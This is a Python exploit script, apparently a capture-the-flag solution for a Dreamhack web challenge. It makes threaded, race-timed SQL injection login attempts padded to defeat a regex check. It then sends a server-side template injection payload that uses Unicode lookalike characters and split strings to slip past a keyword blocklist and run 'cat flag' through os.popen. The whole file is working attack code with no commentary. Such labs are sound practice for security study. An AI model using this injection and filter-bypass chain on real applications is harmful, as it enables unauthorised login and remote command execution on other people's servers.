import requests
import threading
import time
import html
import re

url = "http://host3.dreamhack.games:12256/"
s = requests.Session()

stop = threading.Event()

def sqli():
    while not stop.is_set():
        res = s.post(f"{url}/login", data={
            "username": "or 1--" + "a" * 499_000, 
            "password": "a"
        }, allow_redirects=False)
        
        if res.status_code == 302:
            print("> Logged in")
            stop.set()

# race regex check
print("> Racing")

threads = [threading.Thread(target=sqli) for _ in range(5)]

for t in threads: 
    t.start()

while not stop.is_set():
    time.sleep(0.5)

stop.set()

for t in threads:
    t.join(timeout=1)

# ssti
def obf(s):
    banned = {
        'class': '𝘤𝘭𝘢𝘴𝘴',
        'global': '𝘨𝘭𝘰𝘣𝘢𝘭',
        'mro': '𝘮𝘳𝘰',
    }

    for bad in banned:
        if bad in s:
            s = s.replace(bad, banned[bad])

    return s

cmd = 'cat flag'
payload = '__class__.__mro__[-1].__subclasses__()[166].__init__.__globals__["__buil""tins__"]["__imp""ort__"]("os").popen("%s").read()' % cmd

res = s.get(f'{url}/admin/server-time', params={
    'time-fmt': 'attr(%s)' % obf(payload)
})

flag = re.findall(r'(DH{.+?})', html.unescape(res.text))[0].strip()
print("Flag:", flag)